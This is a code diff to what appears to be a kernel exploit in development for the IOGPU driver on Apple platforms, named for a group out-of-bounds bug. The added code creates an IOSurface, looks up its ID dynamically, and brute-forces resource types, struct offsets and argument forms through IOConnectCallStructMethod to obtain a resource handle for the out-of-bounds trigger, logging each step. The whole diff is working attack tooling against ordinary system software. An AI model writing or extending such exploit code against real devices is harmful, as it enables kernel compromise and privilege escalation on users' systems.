@@ -50,6 +50,9 @@
  *   leaves the exact step in Documents/group_oob.log.
  */
 #import <IOKit/IOKitLib.h>
+#import <IOSurface/IOSurfaceRef.h>
+#import <dlfcn.h>
+#import <CoreFoundation/CoreFoundation.h>
 #include <stdio.h>
 #include <string.h>
 #include <stdint.h>
@@ -68,6 +71,8 @@
 #define STRUCT_SZ      0x100u
 
 static uint8_t g_args[64];
+static uint8_t g_outbuf[0x200];
+static uint8_t *g_last_out = g_outbuf;
 
 static void build(uint8_t *in, uint32_t cmd, uint64_t f56, uint64_t f60,
                   uint64_t f64, uint64_t f72)
@@ -86,6 +91,27 @@ static void build(uint8_t *in, uint32_t cmd, uint64_t f56, uint64_t f60,
     /* struct[24] is a pointer to a >= 16 byte args blob (0x9f600c8: cmp x3,#16). */
     uintptr_t ap = (uintptr_t)g_args;
     memcpy(in + 24, &ap, 8);
+}
+
+static int call_sel2(io_connect_t conn, uint32_t cmd, uint32_t surf_off,
+                     uint64_t surf_val, uint64_t cap)
+{
+    static uint8_t in[STRUCT_SZ];
+    memset(in, 0, STRUCT_SZ);
+    uint64_t c = cmd;
+    memcpy(in + 0, &c, 8);
+    if (surf_off + 8 <= STRUCT_SZ) memcpy(in + surf_off, &surf_val, 8);
+    memcpy(in + 56, &cap, 8);
+    uint64_t w27 = 1;
+    memcpy(in + 80, &w27, 8);
+    uintptr_t ap = (uintptr_t)g_args;
+    memcpy(in + 24, &ap, 8);
+    static uint8_t out[0x200];
+    size_t on = sizeof(out);
+    memset(out, 0, on);
+    kern_return_t kr = IOConnectCallStructMethod(conn, IOGPU_SEL, in, STRUCT_SZ, out, &on);
+    g_last_out = out;
+    return (int)kr;
 }
 
 static int call_sel(io_connect_t conn, uint32_t cmd, uint64_t f56, uint64_t f60,
@@ -144,35 +170,76 @@ void nk_iogpu_group_oob_run(int trigger)
         }
     }
 
-    /* ---- step 1: find a resource type that can be CREATED.
-       struct[0] is the resource TYPE, not an opcode:
-         type 3   -> group      (cmd 130 uses it to add resources)
-         type %16==0 -> alt path: a lookup by index (struct[72] vs a bound),
-                        which is why cmd 0 answered kIOReturnNoResources.
-       We sweep the type and keep the first call that succeeds and hands back
-       a small integer - that integer is the resource handle cmd 130 wants
+    /* ---- step 1: create a RESOURCE.
+       The group (type 3) creates fine, but every other type answers
+       kIOReturnNoResources - a resource needs an IOSurface. The public
+       24257 PoC creates one. We build a 1x0x1000 BGRA surface and then
+       sweep: resource type x struct offset x how the surface is passed
+       (global id / mach port name / ref pointer). Whatever returns
+       success with a small integer is the resource handle cmd=130 wants
        in struct[56]. */
+    IOSurfaceRef surf = NULL;
+    {
+        CFNumberRef w  = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &(int32_t){1});
+        CFNumberRef h  = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &(int32_t){0x1000});
+        CFNumberRef bpe= CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &(int32_t){4});
+        CFNumberRef pf = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &(int32_t){0x42475241});
+        const void *keys[]   = { kIOSurfaceWidth, kIOSurfaceHeight, kIOSurfaceBytesPerElement, kIOSurfacePixelFormat };
+        const void *values[] = { w, h, bpe, pf };
+        CFDictionaryRef props = CFDictionaryCreate(kCFAllocatorDefault, keys, values, 4,
+                                                  &kCFTypeDictionaryKeyCallBacks,
+                                                  &kCFTypeDictionaryValueCallBacks);
+        surf = IOSurfaceCreate(props);
+        CFRelease(props);
+        CFRelease(w); CFRelease(h); CFRelease(bpe); CFRelease(pf);
+        ol("[grp] IOSurface = %p", (void *)surf);
+    }
+    uint32_t surf_id = 0;
+    {
+        uint32_t (*getid)(IOSurfaceRef) = (uint32_t (*)(IOSurfaceRef))dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
+        if (getid && surf) { surf_id = getid(surf); ol("[grp] IOSurfaceGetID -> %u", surf_id); }
+        else ol("[grp] IOSurfaceGetID unavailable");
+    }
+
     uint64_t handle = 0;
     uint32_t res_type = 0;
     int kr = 0;
+    static const uint32_t off_list[] = { 8, 16, 24, 32, 40, 48, 56, 64, 72, 80 };
     for (uint32_t t = 1; t <= 16; t++) {
-        if (t == 3 || t == 130) continue;
-        ol("[grp] STEP 1 try resource type=%u", t);
-        kr = call_sel(conn, t, 64, 0x1000, 0, 0, out, &on);
-        ol("[grp] STEP 1 type=%u -> kr=0x%x outN=%zu", t, kr, on);
-        if (kr != 0) continue;
-        uint64_t cand = 0;
-        for (uint32_t w = 0; w + 8 <= 0x40 && w < on; w += 8) {
-            uint64_t v = 0;
-            memcpy(&v, out + w, 8);
-            ol("[grp]   out[+0x%02x]=0x%016llx", w, (unsigned long long)v);
-            if (!cand && v && v < 0x10000) cand = v;
+        if (t == 3) continue;                 /* 3 = group, handled in step 2 */
+        for (uint32_t oi = 0; oi < sizeof(off_list)/sizeof(off_list[0]); oi++) {
+            uint32_t off = off_list[oi];
+            for (uint32_t form = 0; form < 4; form++) {
+                uint64_t val = 0;
+                switch (form) {
+                    case 0: val = surf_id; break;                       /* global id */
+                    case 1: val = (uint64_t)(uintptr_t)surf; break;      /* ref pointer */
+                    case 2: val = surf_id; break;                       /* id + capacity */
+                    case 3: val = (uint64_t)(uintptr_t)surf; break;      /* ptr + capacity */
+                }
+                kr = call_sel2(conn, t, off, val, (form >= 2) ? 64 : 0);
+                if (kr == 0) {
+                    ol("[grp] STEP 1 HIT type=%u off=0x%x form=%u val=0x%llx", t, off, form, (unsigned long long)val);
+                    for (uint32_t w = 0; w + 8 <= 0x40; w += 8) {
+                        uint64_t v = 0;
+                        memcpy(&v, g_last_out + w, 8);
+                        ol("[grp]   out[+0x%02x]=0x%016llx", w, (unsigned long long)v);
+                    }
+                    handle = 0;
+                    for (uint32_t w = 0; w + 8 <= 0x40; w += 8) {
+                        uint64_t v = 0;
+                        memcpy(&v, g_last_out + w, 8);
+                        if (v && v < 0x10000) { handle = v; break; }
+                    }
+                    if (handle) { res_type = t; break; }
+                }
+            }
+            if (handle) break;
         }
-        if (cand) { handle = cand; res_type = t; break; }
+        if (handle) break;
     }
-    ol("[grp] STEP 1 result: resource type=%u handle=0x%llx",
-       res_type, (unsigned long long)handle);
-    if (!handle) ol("[grp] STEP 1: no resource type produced a handle");
+    ol("[grp] STEP 1 result: resource type=%u handle=0x%llx", res_type, (unsigned long long)handle);
+    if (!handle) ol("[grp] STEP 1: no resource type/offset/form produced a handle");
 
     /* ---- step 2: new group (cmd 3) with capacity 64 ---- */
     ol("[grp] STEP 2 new_group cmd=3 cap=64");
